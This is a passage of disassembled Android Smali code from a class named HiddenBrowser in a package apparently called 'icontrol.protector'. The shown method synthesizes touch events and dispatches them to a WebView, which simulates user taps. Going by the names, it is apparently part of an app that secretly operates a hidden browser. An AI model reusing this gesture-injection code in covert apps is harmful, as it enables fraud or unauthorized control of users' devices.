    move-wide/from16 v8, v16

    move-object/from16 v19, v13

    move/from16 v13, v18

    invoke-static/range {v6 .. v13}, Landroid/view/MotionEvent;->obtain(JJIFFI)Landroid/view/MotionEvent;

    move-result-object v6

    iget-object v7, v1, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v7, v6}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    add-int/lit8 v0, v0, 0x1

    move-wide/from16 v6, v16

    move-object/from16 v13, v19

    goto :goto_0

    :cond_0
    move-object/from16 v19, v13

    add-long v8, v6, v4

    const/4 v10, 0x1

    array-length v0, v2

    sub-int/2addr v0, v3

    aget-object v0, v2, v0

    iget v0, v0, Landroid/graphics/Point;->x:I

    int-to-float v11, v0

    array-length v0, v2

    sub-int/2addr v0, v3

    aget-object v0, v2, v0

    iget v0, v0, Landroid/graphics/Point;->y:I

    int-to-float v12, v0

    const/4 v13, 0x0

    move-wide v6, v14

    invoke-static/range {v6 .. v13}, Landroid/view/MotionEvent;->obtain(JJIFFI)Landroid/view/MotionEvent;

    move-result-object v4

    iget-object v0, v1, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0, v4}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v13

    const/4 v9, 0x0

    array-length v0, v2

    sub-int/2addr v0, v3

    aget-object v0, v2, v0

    iget v0, v0, Landroid/graphics/Point;->x:I

    int-to-float v10, v0

    array-length v0, v2

    sub-int/2addr v0, v3

    aget-object v0, v2, v0

    iget v0, v0, Landroid/graphics/Point;->y:I

    int-to-float v11, v0

    const/4 v12, 0x0

    move-wide v5, v13

    move-wide v7, v13

    invoke-static/range {v5 .. v12}, Landroid/view/MotionEvent;->obtain(JJIFFI)Landroid/view/MotionEvent;

    move-result-object v15

    iget-object v0, v1, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0, v15}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    const-wide/16 v5, 0x64

    :try_start_0
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    move-object v5, v0

    invoke-virtual {v5}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v7

    const/4 v9, 0x1

    array-length v0, v2

    sub-int/2addr v0, v3

    aget-object v0, v2, v0

    iget v0, v0, Landroid/graphics/Point;->x:I

    int-to-float v10, v0

    array-length v0, v2

    sub-int/2addr v0, v3

    aget-object v0, v2, v0

    iget v0, v0, Landroid/graphics/Point;->y:I

    int-to-float v11, v0

    const/4 v12, 0x0

    move-wide v5, v13

    invoke-static/range {v5 .. v12}, Landroid/view/MotionEvent;->obtain(JJIFFI)Landroid/view/MotionEvent;

    move-result-object v0

    iget-object v2, v1, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v2, v0}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    invoke-virtual/range {v19 .. v19}, Landroid/view/MotionEvent;->recycle()V

    invoke-virtual {v4}, Landroid/view/MotionEvent;->recycle()V

    invoke-virtual {v15}, Landroid/view/MotionEvent;->recycle()V

    invoke-virtual {v0}, Landroid/view/MotionEvent;->recycle()V

    return-void
.end method
